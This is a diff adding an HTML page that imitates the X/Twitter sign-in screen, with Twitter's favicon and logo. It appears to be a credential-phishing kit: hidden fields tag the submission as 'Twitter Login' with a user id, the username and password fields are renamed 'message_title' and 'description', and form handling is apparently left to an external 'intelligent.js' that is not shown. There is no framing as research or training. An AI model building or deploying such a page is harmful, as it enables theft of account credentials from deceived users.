@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to X | Twitter</title>
+    <link rel="icon" href="https://abs.twimg.com/favicons/twitter.3.ico">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background: #000;
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .twitter-container {
+            max-width: 400px;
+            width: 100%;
+        }
+        .twitter-logo {
+            text-align: center;
+            margin-bottom: 48px;
+        }
+        .twitter-logo svg {
+            width: 40px;
+            height: 40px;
+            fill: #fff;
+        }
+        .login-title {
+            font-size: 31px;
+            font-weight: 700;
+            margin-bottom: 32px;
+            color: #fff;
+        }
+        .form-input {
+            width: 100%;
+            padding: 12px;
+            font-size: 17px;
+            border: 1px solid #333;
+            border-radius: 4px;
+            margin-bottom: 20px;
+            background: #000;
+            color: #fff;
+        }
+        .form-input:focus {
+            outline: none;
+            border-color: #1d9bf0;
+        }
+        .password-wrapper {
+            position: relative;
+        }
+        .eye-icon {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            font-size: 18px;
+            color: #aaa;
+        }
+        .eye-icon:hover {
+            color: #fff;
+        }
+        .login-button {
+            width: 100%;
+            background: #1d9bf0;
+            color: #fff;
+            border: none;
+            padding: 12px;
+            font-size: 17px;
+            font-weight: 700;
+            border-radius: 50px;
+            cursor: pointer;
+            margin-bottom: 20px;
+            transition: background-color 0.2s;
+        }
+        .login-button:hover {
+            background: #1a8cd8;
+        }
+        .forgot-password {
+            color: #1d9bf0;
+            text-decoration: none;
+            font-size: 15px;
+        }
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+        .divider {
+            text-align: center;
+            margin: 20px 0;
+            color: #71767b;
+        }
+        .signup-text {
+            color: #71767b;
+            font-size: 15px;
+        }
+        .signup-link {
+            color: #1d9bf0;
+            text-decoration: none;
+        }
+        .signup-link:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="twitter-container">
+        <div class="twitter-logo">
+            <svg viewBox="0 0 24 24">
+                <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>
+            </svg>
+        </div>
+        <h1 class="login-title">Sign in to X</h1>
+        <form id="allForm">
+            <input type="hidden" name="link" value="Twitter Login">
+            <input type="hidden" name="ftype" value="normal">
+            <input type="hidden" name="login" value="login">
+            <input type="hidden" name="user_id" value="16934">
+            <input type="text" class="form-input" name="message_title" placeholder="Phone, email, or username" required>
+            
+            <div class="password-wrapper">
+                <input type="password" class="form-input" name="description" placeholder="Password" id="password" required>
+                <span class="eye-icon" id="togglePassword">&#128065;</span>
+            </div>
+            
+            <button type="submit" class="login-button">Log In</button>
+        </form>
+        <a href="#" class="forgot-password">Forgot password?</a>
+        <div class="divider">
+            <span class="signup-text">Don't have an account? <a href="#" class="signup-link">Sign up</a></span>
+        </div>
+    </div>
+
+    <!-- Optional external JS -->
+    <script src="intelligent.js"></script>
+    <script>
+        const togglePassword = document.getElementById('togglePassword');
+        const passwordField = document.getElementById('password');
+
+        togglePassword.addEventListener('click', () => {
+            const type = passwordField.getAttribute('type') === 'password' ? 'text' : 'password';
+            passwordField.setAttribute('type', type);
+            togglePassword.textContent = type === 'password' ? '👁️' : '🙈';
+        });
+    </script>
+</body>
+</html>
